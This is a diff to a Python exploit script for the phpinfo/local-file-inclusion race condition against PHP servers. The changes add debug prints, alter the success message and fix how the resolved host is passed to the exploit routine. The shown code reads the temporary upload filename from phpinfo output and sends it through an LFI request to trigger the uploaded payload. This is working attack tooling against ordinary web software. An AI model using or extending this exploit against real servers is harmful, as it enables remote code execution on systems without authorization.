@@ -160,12 +160,15 @@ class ThreadWorker(threading.Thread):
                     data += phpinfo_s.recv(self.offset)
                 i = data.index(b"[tmp_name] =")
                 match = re.search(br'\[tmp_name\] =&gt; (.*)\n', data[i:])
+                # print(match.group(1))
                 if not match:
                     print("not found tmp_name")
                     return None
                 filename = match.group(1)
                 lfi_s.sendall(self.lfi_req % filename)
+                # print(self.lfi_req % filename)
                 response = lfi_s.recv(4096)
+                # print(response)
                 if self.tag in response:
                     return filename.decode()
                 return None
@@ -252,6 +255,7 @@ def get_offset(host, port, php_info_req):
     if i == -1:
         print(f"Response received: {response.decode(errors='replace')}")
         raise ValueError("No php tmp_name in phpinfo output")
+    print(response[i:i+64])
     print("found %s at %i" % (response[i:i+10].decode(), i))
     return i + 256
 
@@ -303,7 +307,7 @@ def run_phpinfo_exploit(args):
                 break
         print()
         if event.is_set():
-            print("Woot! \m/")
+            print("Woot!")
         else:
             print(":(")
     except KeyboardInterrupt:
@@ -371,7 +375,7 @@ def main():
     print("-=" * 30)
 
     try:
-        host = socket.gethostbyname(args.host)
+        args.host = socket.gethostbyname(args.host)
     except socket.error as e:
         print(f"Error with hostname {args.host}: {e}")
         sys.exit(1)
@@ -380,7 +384,7 @@ def main():
     if args.enum_files:
         run_enumeration_mode(args)
     else:
-        run_phpinfo_exploit(args, host)
+        run_phpinfo_exploit(args)
 
 if __name__ == "__main__":
     main()
